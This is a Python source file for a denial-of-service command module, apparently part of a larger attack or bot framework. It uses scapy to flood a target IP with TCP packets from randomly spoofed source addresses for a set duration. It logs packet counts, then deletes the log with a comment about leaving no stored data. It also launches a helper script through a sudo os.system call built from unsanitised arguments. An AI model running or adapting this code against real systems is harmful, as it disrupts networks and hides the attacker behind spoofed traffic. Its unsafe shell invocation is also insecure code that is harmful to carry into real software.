import random
import os
from scapy.all import *

from commands.command_base import CommandBase

class Dos(CommandBase):
    def __init__(self, target_ip, source_port, max_duration):
        self.target_ip = target_ip
        self.source_port = source_port
        self.max_duration = max_duration

    def get_details(self):
        with open('dos_details.txt', 'r') as f:
            details = f.read()
        os.remove('dos_details.txt') # ensuring that there is no data being stored
        return details
    
    def execute(self):
        os.system(f"sudo python dos_util.py {self.target_ip} {self.source_port} {self.max_duration}")
    
    def run(self):
        self._num_packets = 0

        self.start_time = time.time()
        while True:
            a = str(random.randint(1,254))
            b = str(random.randint(1,254))
            c = str(random.randint(1,254))
            d = str(random.randint(1,254)) 
            
            source_ip = f"{a}.{b}.{c}.{d}"
            IP1 = IP(src = source_ip, dst = self.target_ip)
            TCP1 = TCP(sport = self.source_port, dport = 1025)
            pkt = IP1 / TCP1
            send(pkt)
            self._num_packets+=1

            if (time.time() - self.start_time) >= self.max_duration:
                break
        self.end_time = time.time()

    def write_details(self):
        f = open("dos_details.txt", "x") # throws error if a file is stored
        f.write(f"Target IP: {self.target_ip}\nStart time: {time.ctime(self.start_time)}\nEnd time: {time.ctime(self.end_time)}\nDuration: {(self.end_time-self.start_time)}s\nNumber of packets sent: {self._num_packets}")
        f.close()

